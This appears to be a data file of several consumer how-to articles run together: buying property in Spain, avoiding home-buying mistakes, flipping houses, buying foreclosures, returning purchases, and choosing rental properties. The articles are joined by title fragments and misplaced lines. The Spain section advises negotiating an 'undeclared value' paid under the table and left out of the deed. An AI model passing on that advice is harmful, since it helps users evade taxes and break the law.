Modern semidetached (casa adosada) – These properties are most often built as parts of large new developments, and typically feature two stories and a small private garden. They are good both as permanent homes and vacation homes, offering the privacy and space of a villa with the relatively low upkeep of an apartment. They are still rare outside of highly developed areas.
Village house (casa de pueblo) – These village homes are typically semi-detached townhouses. They offer a lower price, village ambiance and shops and stores in walking distance. However, they usually also need a good deal of work, particularly on the kitchen and bathrooms. For those looking for vacation homes, they are also less than ideal as it can be difficult to find property management companies in smaller villages.
Country house or farm house (cortijo / masia / casas rural / finca) – These properties are less expensive than coastal properties. They offer good value and idyllic surroundings. However, particularly for those who are not fluent in Spanish, they can also be isolating. They are not ideal as vacation homes or rental properties, as upkeep and management at a distance is challenging.

, There are different rules and taxes in Spain depending on whether you are buying off-plan property, new construction, or resale property.


Resale property – These properties are generally safer investments, as you don’t have to worry about whether or not they will be completed. Taxes upon purchase are also generally lower. However, you should be prepared to spend money on repairs and updates, particularly in the kitchen and bathrooms.New construction (obra nueva) – This is the most expensive type of property, although recently rampant construction in Spain has led to a market with too many homes and not enough buyers, bringing down the price. The biggest advantages are that unlike with off-plan properties, you know exactly what you are getting, and unlike with resale properties, you won’t have to do any remodeling.Off-plan (sobre plano) property – This is property for which the plans have been finalized and approved by local authorities, but for which construction has not yet finished. The benefit is that compared to completed new properties, you should get a discount of 10% to 20% off the current market price. On the other hand, you will have to rely on plans and your imagination; you won’t see the actual property you have purchased until it is finished. And, you will have to wait a year and a half or more to move in, if everything runs smoothly. It is imperative that you choose an established, reliable developer to ensure timely, quality construction, and that you do a thorough inspection to locate construction problems before completing the sale., Many who buy their property as a vacation home plan to rent it out for short blocks of time (three months or less) to vacationers in order to make income when they are not there. However, this is not always legal in Spain. In many areas, there are limits on renting property short-term, as well as on marketing private property to tourists. If you fail to comply with local rules, fines can be as high as 30,000 euros.Before you buy, seek independent legal advice, speak with a property management company, or check the rules for short-term rental at your local town hall to make sure it is permitted.

, Agents can not only find you the right property, but also guide you through the legal process of purchasing it. Remember, though: estate agents in Spain are paid by the seller, so they do not always have the buyer’s interest in heart. The best way to select an agent is through the recommendations of friends and acquaintances, followed by an interview to ensure you are comfortable working together. There are several types of broker you can choose between:Corredores – These are local brokers in rural Spain who know when people want to sell and who charge very small commissions – about 1% to the buyer and seller each. Few speak Spanish or have offices, but if you are fluent, it is worth spending time in an area to seek out the local corredor.
Buyer’s Agents – These agents are paid an upfront fee to search for properties on behalf of clients, but unlike search and find companies, they receive no commission from estate agents, meaning they are free to show properties from private sellers. They will visit and inspect potential properties, as well as walk client’s through the purchase process. They usually charge a successful search fee of about 2.5% of the sale price.
Foreign-Based Agents offering Spanish Property – Look for offices that have opened their own branch in Spain. They will know much more about the local market than those who simply pass clients on to agents in Spain in return for part of the commission.
Foreign-Owned Estate Agents – Because there are no qualifications to become an estate agent in Spain, the numbers of agents catering to foreigners – the English in particular – has exploded in recent years. There are of course good agents, but be forewarned that in many areas, they charge excessive commissions (7.5% and up) and use pressure-sales techniques.

, There are several types of broker that you should avoid, as they add negligible value while inflating the commission you must pay.Online Property Companies – Most of these companies do not have offices in Spain or their own listings. Instead, they are marketing companies that list agent’s properties in return for a cut of the commission. As a result, they often charge inflated fees. Also, many listing are out of date. Other attractive properties are not actually for sale; they are listed only so the agent can acquire interested parties’ contact info.
Introducers – These are people – generally expats – who befriend local visitors and offer to introduce them to trustworthy estate agents, in return for part of the agent’s commission. Be warned: they are most likely to introduce you to aggressive agents seeking high commissions.
Search and Find Companies – These companies do not list their own properties. Instead, they will search for properties that meet a client’s specifications, drawing up lists of properties to be examined. They work by splitting the commission with local real estate agents, which often leads to inflated fees.
Multi-Listing Networks – Foreign agents and Spanish agents alike often participate in networks whereby they can show clients one another’s listings. When shown a listing, always clarify if it is from another agent, and if so, whether the commission will be split or simply increased, as is often the case.

, It is best to hire a lawyer before you set out to inspect possible purchases. Otherwise, you may find yourself pressed for time and be unable to properly interview and research the lawyer you choose.You will want a lawyer who is fluent in English and Spanish, and who specializes in Spanish land law (urbanismo). They can help guide you through the purchase process and inform you of the tax implications.If choosing a lawyer in your home country, be sure that they have experience working in Spain.
If you choose a lawyer based in Spain, as for their registration number, which you can use to see if they are registered with the local bar association (Colegio de Abogados).

, You will want to visit the property to ensure that you like both the home and the area where it is located. If it is an existing structure, consider hiring a property inspector to walk through the building with you. Take careful note of any repairs or remodeling you will need to do. If you are purchasing off-plan, be sure to carefully consider the plans and completion schedule and to talk with both the developer and locals to ensure that you are working with a reliable company.

, To buy in Spain, you will need insurance, a fiscal number, euros, and a Spanish bank account. It is best to set these things up in advance in order to save money.


Fiscal number (numero de identificacion de extranjeros) – This is your identification number for tax purposes in Spain. It can be obtained by you or an agent in Spain and takes 2 to 6 weeks to acquire.Foreign Exchange Account – If your funds are in a currency other than euros, you will need to purchase euros. Using a currency broker is by far the cheapest way to do so, and may save you thousands. Contact one ahead of time to ensure you get the best rate on your transaction.Insurance – If you use a Spanish mortgage, the lender will help to arrange insurance. Otherwise, you will need to purchase your own insurance through a Spanish company.
Bank account – Most sellers will only accept checks drawn on Spanish banks, so you will need a local account. If you have taken out a Spanish mortgage, it is easiest to open an account at the bank that lent you the money. Otherwise, be careful to discuss transaction fees for international transfers before opening an account., If you are not fluent in Spanish, you should be sure that you have all contracts and legal documents translated into English by an independent translator. You want to be 100% certain that you understand the full content of what you are signing.You can find a list of accredited translators on the website of the Spanish Ministry for Foreign Affairs.

, Work with your lawyer to lower the price as much as possible, regardless of the type of construction you are purchasing.


Off-plan property – You will want to negotiate any input you will have into the style of construction, as well as a clause stipulating that you can withhold 5% of the price at the signing of the deeds, to be paid after the developer has fixed any problems you identify in the construction.
Re-sale property – Negotiate the price, the undeclared value (the amount of the price to be paid under the table and not declared in the deed – try to avoid paying it if possible and never go over 10%), deadlines, who pays the plusvalia (a municipal tax on the increase in land value, usually paid by the seller), any extra fixtures included in the price, access to the property before closing (so that your architect can start estimating the cost of remodeling), and the deposit method (it is best to pay to a third party, preferably a lawyer, who will hold the funds in escrow until the sale is complete).New property – Negotiate the price, undeclared value, deadlines, the pusvalia, and the deposit method.

, This is the point of no return, after which there will be serious financial implications to backing out. Do not rush into it. Before signing anything, be sure you have had your lawyer look over it. Don’t allow developers or real estate agents to pressure you into signing without due diligence. The UK government offers a helpful checklist of things to consider before signing.


It is recommended to visit the property you plant to purchase and to sign all the necessary contracts in person at the notary’s office, but this is not always possible. The easiest alternative is to have someone represent you as a ‘verbal representative’ (representante verbal). Soon after the purchase, you will need to ratify the representation at a Spanish Consulate in your own country or at the Spanish notary’s office when next you visit Spain. Completing a power of attorney is also possible, though not recommended.Off-plan property – Don’t sign a reservation contract (which take the property off the market for 30 days) in return for a fee (usually 6,000 euros) unless it has a clause stating that the deposit will be returned if you do not proceed. The point of no return is the payment construction contract (contrato de compraventa de vivienda en construccion). Be sure to have your lawyer do due diligence before signing. This contract is accompanied by a first payment of around 25% of the price, plus IVA. The remaining payments will be made in stages or all at once when you sign the deed, depending on how you negotiate the contract.Resale or new property - Your lawyer should perform due diligence before you sign a private contract with the seller and pay the initial deposit (generally 10%). Afterwards, you will have 1 to 3 months to get your funds in place. You will then transfer the remaining funds, sign the deeds before a notary, and take possession of the property. Finally, you will register your title and pay any relevant taxes., Congratulations! Now that you have the keys to your new Spanish property, you can start the process of remodeling it and furnishing it, whether for your own purposes or to serve as a rental property.

Don't take out any other loans before the deal is closed.",How to Avoid Mistakes when Buying a Home," We've all heard of ""eyes being too big for our pockets,"" so before you fall in love with a property make sure you've got your financing set up. Inexperienced borrowers or those who are naturally impulsive should take extra care. It's one thing to overspend when you're buying a dress, but it's another thing when you're buying a house.


It's a great idea to have pre-approval for a loan before beginning your property search. This way you have a limit to observe and can avoid taking on too much debt.
To get pre-approved, consult with a lender to discuss your loan options and your budget. The lender will then check your credit. You'll need proof of income, proof of assets, good credit (usually 620 or higher), and proof of employment.Familiarize yourself with the different types of loans that are available. VA, FHA, and conventional loans are all available through banks and other approved lenders.VA loans are guaranteed by the Veterans Administration (VA) and are available to veterans, current members of the U.S. Armed Forces, or eligible surviving spouses. A benefit of VA loans is that they do not require a down payment.
FHA loans are guaranteed by the Federal Housing Administration (FHA). Anyone can apply for these loans, and they often offer good benefits, such as low closing costs and low down payments. There is, however, a limit on how much you can borrow.
Conventional loans are not government-backed like VA or FHA loans, so they may be more difficult to secure. If you have good credit, a steady income, and can afford a down payment, you should be eligible for a conventional loan.


Make sure the mortgage loan originator sees your credit report and your income and asset documents to verify all information prior to issuing a pre-approval. You don't want an uninformed pre-qualification. That could lead to debt problems later.;
, Lenders consult major credit-reporting agencies before they complete a loan application. Bad credit can result in higher interest rates or rejected loan applications and prevent you from owning your dream home. Take steps to raise your credit score and remove any erroneous information in your credit reports.Research your credit rating a couple of months before applying for a loan. This will give you time to repair any mistakes that may be on your credit report.You can get an FHA loan if your credit score is under 580, but you will have to pay a higher down payment. The VA does not have a requirement for credit scores, but most private lenders will be looking for a score of 620 or higher. For a conventional loan, your score should be 740 or higher.
Don't sugar-coat a bad credit rating. It's best to report your credit rating and personal debt accurately. Doing otherwise is not only illegal but extremely unwise.
You can usually boost your credit score by lowering your credit card balances or paying down other debts.
Check your credit score on a free credit reporting website, such as www.creditkarma.com.

, When considering how much home you can afford, know your borrowing capacity. This figure is based on your income-earning ability, not the assets you own; however, if you do have a large amount of assets, you can sell off some of the assets to place a larger down payment on a home. This will lower your payments.

, First-time buyers rarely understand how many additional costs come with homeownership. Consult with your real estate agent and mortgage lender to get an idea of what additional fees you'll be responsible for. Remember to budget in the following when setting up your financing:


Homeowners insurance
Appraisal fee
Property taxes
Moving costs
Escrow fees
Other fees and taxes, where applicable., You can either go the traditional route and pay about 20% of the home's value as a down payment or finance more purchase at once with a smaller down payment. Keep in mind that saving for a larger down payment is still considered the safer route and is always cheaper for you.


Gone are the days when you had to save up for a 20% down payment in order to own your dream home. In some cases, you can borrow up to the full price of the property, which means you don't have to spend years saving for a down payment before buying.
However, if you do put down less than 20% of the purchase price, you will likely be asked to buy private mortgage insurance (PMI), which is not cheap. This protects the lender, not you. Avoiding PMI by making a 20% down payment is usually considered a good investment.You may also have to pay higher closing fees or a higher interest rate on your loan.
There is no down payment required for a VA loan. An FHA loan requires a minimum down payment of 3.5% if your credit is 580 or higher. If your score is under 580, a 10% downpayment is required.

, If you can afford to make more than your scheduled mortgage payments, do so. With interest calculated daily and charged monthly, larger or more frequent payments will reduce the amount and length of your mortgage. In general, make sure that you expect to have an income stable enough to pay down the mortgage over the life of the loan.

, Even if you're not considering moving for some time, remember that your situation can always change and you may choose to or be forced to sell. Think about how well you could sell the house in this situation. Would it go quickly if put back on the market?Additionally, think about purchasing a house that will be worth more in the future, perhaps in a growth area or new development neighborhood.

, Choose a real estate agent who has the time to answer all of your questions and provide you with useful information about your home purchase. Be sure to also choose an agent who you are comfortable with and trust. Ask friends and family for recommendations.Remember that an agent typically works for the seller and will benefit from getting the highest possible price in a sale. You can offset this situation by hiring your own agent to look out for your best interests.
While the services of a buyer's agent or a property advisor don't come cheap, they can be worthwhile. They will advise you about the age and soundness of the home as well as the desirability of the neighborhood and its outlook for the future.
A buyer's agent will not usually increase the cost of the home for the buyer, however. This is because the selling agent will have already added their commission to the listing price of the home. If there is a buyer's agent, then the commission will be split between both agents. If there is no buyer's agent, then the seller's agent will keep the entire commission.

, Give your agent as much information as possible about your needs and desires. This will help them find the best houses for you. Once you've started looking at potential homes, don't let your agent talk you into something that you don't want. Remember your needs and remind your agent of those needs if necessary., Be sure to do research at several different mortgage lenders around your area and find the best possible rates you can get. Ask questions about any part of the lending process that you don't understand and have the broker walk you through it if necessary. Make sure you're as comfortable with your lender as you are with your real estate agent., Even though the house has already been appraised, you'll want to hire your own inspector to give the house a thorough check-up. The inspector will spot problems throughout the house, if any exist, and can also give you an estimate of the cost of repairs. This can allow you to negotiate a lower price with the seller.


Get inspector recommendations from your realtor or friends who have purchased homes in the area., Many buyers make the mistake of ignoring huge flaws in a property simply because it perfectly fulfills one of their wishes. Maybe the house has an unstable foundation but the backyard and kitchen are perfect. Step back and take a breath, weighing the ups and downs of a property with a cool head before settling on a property. If in doubt, talk it out with friends or family.


You may want to talk with a builder before purchasing a home. Depending on the market, you may be able to build a brand-new home for around the same cost of a pre-owned home.
It may help to treat the house an investment. Consider the value you're getting and resale value you can get back., Research the areas that your potential homes are in. Make sure they have all of the amenities you need. Make sure they're safe enough. Consider the amount of time it will take you to get to work or nearby schools. Consider the following:


The lighting and mood of the home, street and neighborhood at night
Listen for noisy neighbors.
Is public transport within walking distance?
Are your living and social needs adequately provided for in the area?
Research the area on real estate websites.
Look for nearby parks or recreation areas.
Keep your eye out for information regarding trends in the area.
Check out the local council's and services' websites. Does your area have what you're after?

, Whether or not they are things you feel you can fix yourself, negotiate a lower price to offset the cost of repairs. Chances are, your inspector will spot and mention these flaws or damages to you. But be on the lookout for anything unexpected yourself, just in case there's anything else you want to ask about. Be sure to bring up any concerns you have before signing the contract to buy.


Get any agreed-upon repairs in writing and double check to make sure they make it into the final contract before signing., A big mistakes often made by homebuyers is rejecting a good fit simply because they didn't like one element of the house, for example paint colors or the type of cabinets in the kitchen. Recognize the difference between things that are easy to change and those that are not. Look at the ""bones"" of the house, like the layout, windows, and other elements that would be difficult and expensive to change. If these are good, you can change the rest to suit your needs., If you choose a house with the intention of making major changes to it, consider the price of doing so beforehand. You may even want to hire a contractor and get an estimate of what your addition might cost. You don't want to get into the new house only to find that you can't afford the changes you wanted to make. Factor them into your budget before buying.

, Take a moment to consider the seller's perspective, which may give you an idea of how motivated they are to sell their home. Consider things like how long the house has been on the market, the status of the local real estate market, and any other information you can obtain about the seller. If you find out that they have already accepted a job in another state and are looking to move, or are headed into bankruptcy, or if they just went through a divorce, you may find that the seller is willing to accept a lower price because they just want the house off their hands. This type of information can give you more bargaining power.That being said, try not to give the seller the same advantage. Don't give up too much information about yourself, or your attachment to the house. Even making it clear that you want to pay cash for the purchase may make it harder for you to negotiate a good price.

, Use the information you gathered during your investigation of the house and its location to negotiate a price. Things like the sale prices of comparable homes, knowledge of any repairs you will need to make, and the community can all give you leverage while trying to determine a price. The more information you have, the better.

, You may miss out on your dream home if you become too stubborn during negotiations. Put your ego aside and think about the important things — Do you really like the house? Does the price still fit your budget? Did you try negotiating? If you're holding out for the seller to drop the price lower not because of your budget, but because you want to feel good about your negotiation skills, let that go and accept the offer. Don't lose out on a great house because you had too much pride to pay a little more that you hoped.If the seller doesn't negotiate down to a price that is within your budget, then it is okay to walk away.

, The lender will check your credit before the closing to make sure nothing changed after they approved the loan. You may want to take out a loan to furnish your car or make another big purchase, but hold off until the deal is closed. A new loan on your credit report can put your home loan at risk."

Familiarize yourself with how to buy a home or condo.,
Understand the risks of flipping a home.,
Educate yourself about the real estate market in which you're investing.,
Look for a home that can be substantially improved with the least amount of time and resources.,
Obtain a loan for at least several thousand dollars more than the price of the property you wish to flip.",How to Flip a House1," If you've already done that, then you already know the process and it's second nature. If you have not ever purchased a home, then consult with a realtor and a financial adviser. There are a few steps involved when purchasing a home so you need understand that process, such as: placing an offer, getting a mortgage, removing conditions and taking possession.



Placing an offer: Since verbal offers don't constitute a legally enforceable sale, you need to draft a written offer and give it to the owners and/or realtor. The offer stipulates price as well as the terms and conditions of the sale. If the offer is accepted, the offer becomes a legally-binding sales contract.

Getting a mortgage: Unless you have heaps of cash handy, you'll need a mortgage. There are dozens of kinds of loans out there, so examine the ones that might work for you and talk to a mortgage broker if you have any questions. Some mortgages (ARMs) have special ""teaser"" interest rates that stay low in the beginning and raise up significantly after a certain period of time.These might be attractive if you plan on selling the home quickly.

Removing the conditions: This is usually what the buyer does once the seller has accepted their offer.It is a legal move that the buyer (usually) makes in order to communicate that any obligations entered into by both or either parties have been met.;
, Flipping a home can be risky. You're incurring a large amount of debt for a potential payoff in the future. Except sometimes, that payoff doesn't materialize, or it doesn't materialize as quickly as we might have liked. You could be sitting on a property for longer than expected, paying a mortgage, property taxes, and continual upkeep. Sometimes, you will need to sell a home for less than you bought it for. Often, you're at the mercy of a quivering housing market.


The amount of physical effort required is also a potential risk. How fit are you and how willing are you to do a lot of the DIY work involved in flipping the house? If you've never done renovations or fixes before, it will be a steep learning curve and the less you know, the longer it'll take to flip the house.

, Read magazines such as Forbes, Entrepreneur, and Money; these often have articles about real estate. Begin to understand how the real estate market works, what constitutes a good and a bad deal, and how to anticipate future growth or contraction in the future.


The housing market is like the stock market. It has both bull cycles (meaning optimism, growth, and high demand) and bear cycles (meaning pessimism, contraction, and low demand). The difference is that the housing market can take many more years than the stock market to switch from one cycle to another.
After talking to at least three realtors and doing some investigation, if you find that the market is in low demand and everyone and their dog seems to be trying to liquidate homes, housing prices are going to fall and profit margins will fall with them. These kinds of market conditions would make it more challenging to flip a home.
Try to wait for a bull market. Wait to buy until the real estate market has turned back around and more people are trying to buy than sell. This will create better conditions for you to start flipping.

, You're not trying to live in this house; you're trying to buy it, improve it, and sell it. Try not to get attached to the home. Instead, view it purely as a profit-making exercise.


A home with room for improvement might have a run-down yard, an old carpet, a good spot for a carport, or other things that can be fixed with a little money and some hard labor. These types of fixes often provide an excellent return on investment (ROI) when flipping a home.
Some people look for distressed properties. Those are ones that the seller is ""desperate to sell"" for reasons such as: divorce, bankruptcy, death, poor condition of the property, late on payments or other. These give the buyer an inherent advantage over the seller.
Look for homes that sell in the middle to upper range. What that means is the amount where the average family would be able to afford it. Generally that means between about $200,000, and $500,000 depending on your area. You want that price range because these tend to sell the fastest — you have the largest population density looking for these mid range homes. It could be much less or much more but that's about the average. The home generally have 3 or more bedrooms and at least 2 full bathrooms.
Find out what is preferred by residents in the area you're looking to buy into. Simple things like easy access, off-street parking, no-through roads and a quiet neighborhood can make or break the attractiveness of a property.

, You'll need this money for repairs and improvements. Negotiate a purchase of the property and buy. In the offer, be sure to have multiple ways out of the contract. The most common method is to simply put ""subject to financing by date."" If you can't make the financing by then, ask for an extension on the condition date.

Make a list of requirements you have for your foreclosure, such as location, price range, how bad the condition is, type of home, and so on.


It is important to come up with this list prior to finding a real estate agent so that you can hand them your requirements right away. This will help them find properties that meet your needs.;
, Finding bank-owned properties isn’t as easy as it is to find a traditional home. Some listings charge a fee for access, and while there are some free listing sites, the listings are much better on paid sites. Finding an expert real estate agent who knows the foreclosure game can help you find houses you never would have on your own.

, Many bank-owned homes are sold during auctions. Two types of auctions are available: public foreclosure auctions, and public auctions. In order to get to the public auction stage, the house passes first through the foreclosure auction right after liquidation. If it doesn’t sell there, it is turned over to an agent. If an agent can’t sell it, it is given to an auction company.Auctions usually take place quickly and before you have had time to inspect the home.
Some also require that you pay in cash.

, You can find foreclosed homes on the market by doing a simple internet search with the terms “REO properties” or “foreclosures.” The results will reveal listings on both government and bank websites., You can also find foreclosed homes on traditional real estate websites, but these homes are in the hands of real estate agents. If you go after one of these homes, you will have to deal with the agent instead of directly with the bank.


Popular sites that have real estate listings include Zillow and Redfin.

, if you are serious about buying a bank-owned home, consider getting preapproved for a mortgage loan from the bank. You can’t truly consider a home unless you know how much you have available for spending. Do a little planning to make sure your credit score is high before you apply.


When you go apply for a mortgage loan, you need to have documents in hand like proof of income and assets, employment verification, and identity documentation., Real estate agents who have experience selling foreclosed homes are the best ones to consider hiring for your house hunt. Your real estate agent can negotiate with the bank so that you are saved this hassle, as well as find homes that you don’t have access to as a consumer. The real estate agent will also present your offer to the bank.In the foreclosure market, your real estate agent does not have to contract with other buyers' agents in order to look at the home. This means that your agent can show you multiple homes at the same time.

, Before making an offer on house, get the property inspected and appraised so that you know you are getting the best value for your price, and so that you know what risks you are taking by procuring this house. The benefit to house hunting amongst foreclosures is that you don’t have to have a bid on the house before making an inspection.Home inspections can also help you determine the estimated cost of repairs and the condition of the house., Look around in the neighborhood of the foreclosure you have your eye on to determine what price range the house would be in if it were not foreclosed. Make sure that your offer is comparable to these other values. Look up recent sales in the neighborhood on realty websites (or ask your agent) to determine these prices., Ask your agent for advice about how to protect your offer. They may be able to recommend a contract that has contingencies in case you wish to back out at any point in the offer process., Finally, after you have prepared for it, make the actual offer. The price that the house was listed for is most likely set at market value, so you won’t get much wiggle room with the asking price. Work with your agent to determine the best price based on the prices of recently sold homes in the area, as well as your own finance option.


Tell your agent what price you want and they will make the offer to the bank.

, Even though you have done your research and come up with what you believe is a fair price, you will likely be issued a counter offer as the bank searches for the best price it can get. Don't be surprised by a counter offer that is not satisfactory. Make another offer in return if you don't like it.


The bank may not want to negotiate on price since it is usually set at market value, but you may ask for a lower interest rate or lower closing costs.
Banks typically counter any offers under list price, but you can still get an offer accepted under market value by negotiating.

, Although a bank-owned home generally has a clear title, you should never assume this is the case. Search public records or ask your agent to help you find liens or owed taxes on the property you are interested in.Hire a title company to run the title search, making sure that it is a full and insured search, to be certain that there will be no financial snafus when you close the deal.
Make sure the bank pays for the final utilities and any code enforcement fines that are not recorded as liens, as well.

, Be prepared to wait weeks or even months for the negotiation dust to settle. Banks usually shop around for the best price they can get on a foreclosed property, so they may hold out for another buyer if your offer is too low., Once a bank agrees on your price and will sell the house to you, get a hold of your real estate agent and lender to obtain the money you need to pay for the house. In your appeal for cash, you should include estimates on renovations, escrow, closing costs, excise tax, and any other costs you foresee.


Closing costs vary with each home purchase, but can include a credit report fee, a fee for processing your loan, attorney fees, inspection charges, title insurance, and many more.If you are getting financing, the lender will prepare an estimate of the closing costs. If you pay cash, the real estate agent can prepare the estimate.

, After your offer is accepted, the deal can officially be closed. Generally your real estate agent will obtain the keys and give them to you when you sign the final papers for the house.


When you buy a home, just as when you buy a car, you actually have the title signed over to you. This is part of the process once your offer is accepted. This is also the time you agree to pay closing costs.

Find your receipt.,
Collect all parts or accessories.,
Identify why you want to return the item.,
Find your warranty.,
Research return policies online.,
Ship the item to the manufacturer, if necessary.,
Tell the clerk you want to return the item.,
Explain what is wrong.,
Say what you want.,
Answer any questions.,
Complain if you are unhappy.,
File a consumer complaint.",How to Return Something You've Bought in a Shop," You will need your receipt/invoice to return the item.Go through your purse or wallet to find the receipt. You should also check your email account, since the receipt could have been sent to you electronically.


It may be in the bag, which you might have thrown in the trash. Go through to find the bag.
If you don’t have the refund, it may be harder to return. However, some stores will refund without a receipt if the item didn’t cost much. Alternately, others will give you a replacement or store credit (but not a cash refund).;
, You want to return everything that came with the item—packaging, accessories, parts, etc. Find everything and put it in the original box so that you will have it all when you return to the store.If only one part is broke, you still might want to take the entire item to the store and get the entire product replaced.

, Before heading back to the shop, you should know why you want to return the item. This will matter to the shop, so identify the reason before returning to the store. Common reasons for returns are:


It isn’t what you need. Sometimes, we buy the wrong item. For example, you might have bought an electric cord which doesn’t work with your TV. You’ll probably want to return the item and get something different.
You just want a refund. Maybe you regret the purchase or realize you don’t need the item. You’ll probably want a full refund.
It doesn’t work. If the item doesn’t work as expected or as promised, you can return for a refund or to replace it.

, Warranties are usually sold for expensive items like electronics. However, everything you buy comes with “implied” warranties in the United States. These warranties are automatically created by law. If an item violates an implied warranty, the store cannot refuse to take the item back.


For example, every sale carries an “implied warranty of merchantability.” This is a promise that the product will work as you expect it to, given its condition and age.If you buy a toaster and it catches on fire, then it has not worked as you would expect a toaster to.
There is also an “implied warranty of fitness.” This warranty applies when you buy something for a specific purpose. For example, you might need a blender that can crush ice. If a sales associate helps you find one for that purpose, then the blender comes with a warranty that it will crush ice.
In most states, these implied warranties last for four years. However, in some states, they will last longer.
The seller might eliminate these implied warranties by including language that the product was sold “as is.” Look at your receipt and the packaging. Nevertheless, in some states, even the inclusion of “as is” language can’t eliminate implied warranties.

, Check to see if the shop has a website. The website might explain the return policy in greater detail. Find the website and read up on what you need to do.


The website might tell you whether you can ship the item back, which you might prefer as an option. The website should tell you which steps to take.

, You might need to send the item to the manufacturer, especially if the item is defective but covered by the warranty. Check your written warranty to see where you should ship it.


Remember to pack the item securely so that it doesn't break while being delivered.
Ideally, you should call ahead of time and ask for specific directions. For example, the manufacturer might send you a form to fill out to include with the item.

, Smile and say, “Hi, I want to return this item which I bought last week.” Show the clerk the item and your receipt.Don’t delay returning the item. Some stores allow returns but only for a certain amount of time. For example, many stores only allow returns within 14 days of the purchase.

, If the item doesn’t work, explain why. For example, you could say, “The laptop won’t turn on. See? I press the button but the screen is blank.” Always keep your reason for returning the item short. The longer your reason, the more suspicious you appear.Believe it or not, sometimes nothing is wrong with the item. Instead, you may be using it wrong. If so, the clerk can show you how to use it properly.

, Stores have different rules about what you can get when you return an item. Some stores will issue a full refund. However, others might only let you swap the item or issue store credit. State clearly what you prefer.


For example, you can say, “I’d like to swap this item with another if one is available. If not, I’ll take a cash refund.”

, If you don’t have the receipt, the clerk might have questions for you. Answer all questions politely and completely. Remember to remain friendly. You are more likely to get what you want that way.


The store might have a return limit. For example, they might allow only $500 worth of returns in a 12-month period.Be prepared to talk about other returns you have made.

, Ask to speak to a manager if the sales clerk won’t take the item back. Calmly say, “Is there someone else I can speak with?” Work your way up the chain of command. If the store manager won’t help you, ask who else you can speak to.


You may have to write a letter to corporate headquarters.You can find sample letters online.

, If you strike out at the store, you may want to complain to a government agency. The agency will depend on where you live. In the U.S., look for a local consumer protection agency by searching online or looking in your telephone book.You can also find a list here: https://www.usa.gov/state-consumer. Click on your state.


You can also complain to the Better Business Bureau for the city where the shop is located. Also file a complaint with the BBB where the company has its national headquarters.

Give yourself a timeline that outlines your ideal selling scenario.",How to Flip a House2," Time is money, and your object is to get your house renovated and flipped as soon as possible. To that end, create a timeline that lists realistic times for contracting, showing, and selling. You don't have to meet all the goals along the way, but you want to be in the ballpark. A timeline will help you accomplish this.


Note when you expect major renovations to be completed by. Include regular progress reviews to help you stay alert to problems as they arise.
Mark down blocks of time when you're available to work on the house, such as long weekends, vacation time, etc. that you expect to accelerate the work being done.

Do the important fixes first.,
Decide what kind of work you'll put into the home.",How to Flip a House3," That way, if your plan changes (and it very well could), you've done all the important fixes and you only have minor fixes to maneuver around. Also, if your budget becomes bloated, you won't be missing essential fixes like kitchen spruce-ups or basic yard work, and you can push to sell quickly.


Major fixes are things like rewiring the house so that it doesn't fault and cause a fire or electrocution; fixing broken fixtures such as bathtubs, showers and sinks; re-flooring tired carpets or bumpy linoleum; patching up wall/ceiling/door holes; replacing hinges/brackets/fittings, etc. that are loose or broken; repainting peeling or poorly done paintwork; replacing broken tiles/pavers/steps, etc.; renovating anything that is dirty and broken––tired things are less of a concern than dirty things, so prioritize what needs doing most.
More minor fixes include changing paint colors on already decent paintwork; changing working fittings to more modern ones; fitting better storage inside cupboards, etc. All nice to have but not essential if you're squeezed for time and money.
Read books written about what buyers look for in a home. A lot is about presentation––if you can use a few shortcut tricks to enhance the house's look, then you'll save time and money. Of course, you also need to pass the builder's inspection, so this needs to be taken into account for any structural issues that need addressing.
Typically cleaning, paint and plants are the cheapest way to boost the value of a home. A deck also raises the value more than the price of the deck. Replacing electrical and plumbing fixtures and fixing anything broken is also a cheap way to get a good boost in home value.
Remodeling kitchens and bathrooms typically do not raise the value of the home enough because owners tend to pay too much for the remodel.

, Will you do the work yourself on the cheap or do you need a General Contractor or ""GC"" to do the work. If the repairs are minor, then it may be best to go it alone to quickly and cheaply improve the property. For larger projects that require building permits, it's best to hire a GC. As already noted, the key is to make improvements, often merely cosmetic ones, that make the house look much better but won't cost you too much.


Things you can probably do yourself: Repaint. Tear out old carpet to find hard wood floors or re-carpet. Touch up old fixtures. Paint minor areas. Change fittings. Repave patio and entrance areas. Change the color of the front door. Add new handles.
Seek out the cheapest labor you can find (college kids, or even yourself) and have the property immaculately cleaned up and repaired. If there's any money left over after this, put it into a high-interest liquid savings account; do not use it to pay off part of the loan yet.

Stage the house.,
Show the property to potential buyers.,
Sell the home for a significantly higher price than the one at which you purchased the property.,
Remember to report your profit to the IRS.",How to Flip a House4," Staged houses can sell substantially quicker than unstaged houses, sometimes up to 50% faster.Of course, make sure your house is cleaned, de-cluttered, and organized. Try to make the first impression give a lasting impression.


Staged homes often benefit from very neutral colors and features––features that appeal to a wide range of people while not offending very many people. That means a lot of neutral colors (browns, creams, etc.) and not too much flashy furniture. You can rent furniture from a staging company if you wish, or you can be in control of staging the home yourself.
Remove all personal effects from the home. Remember, you want people who view the staging to believe that this home could be their new home eventually. Personal effects such as trophies, children's paintings, holiday souvenirs, and family photos, should all be removed.
Make the home appeal to the senses.
Sight: clean, declutter, organize, leave space for open room, open the drapes, etc.
Smell: put air fresheners in the bathrooms, leave flowers out in the foyer, put out a fresh pot of coffee, etc.
Touch: appeal to your guests to sit in the softest couch; make sure that no dust is left around.
Sound: turn off all noisy generators, TVs, and computer, and instead put on some easy listening music such as jazz.



, Discuss it with them. If a particular problem is repeatedly mentioned, see if you can use some of the money you saved to repair/improve it. Otherwise, modify your selling strategy to distract attention from it. This step should take less than a month, at the very most.


Use the power of the web and your personal network if you're having trouble selling the home. Don't just rely on the broker to make the sale. Put ads up on websites (Craigslist, Zillow, or Trulia are a good starting point) and tap into your social networks to see if anyone might be interested in biting.

, Any annoyances or expenses with the property are now the buyer's problem, not yours. Pay off the loan, deposit your profit, and take a vacation.


Be willing to lower the price if no one is biting. Researching home prices in the area is a must, especially if the price of your home is bloated and you don't even know it. Adjusting the price to a more manageable sum can mean a sale in no time. Paying a mortgage and taxes on an overpriced home because your ego is in the way of lowering the price is not a good way to make money.

, An unreported $100,000 can lead to a painful audit down the road. It's a hassle, but it's a necessary hassle.

Multiple story properties damage lower units when a big water leak occurs.,
Flat roofs only last 1/3 the time of inclined roofs.,

Avoid properties on hills and with basements.,
Buy properties with a view or in in nice residential area.",How to Avoid Buying a Rental Property That Is Hard to Manage," Coordination of repairs in multiple units is a headache that can be avoided by buying single story properties. Multiple story properties also need exterior stairs replaced when weathering and wear and tear occur.;
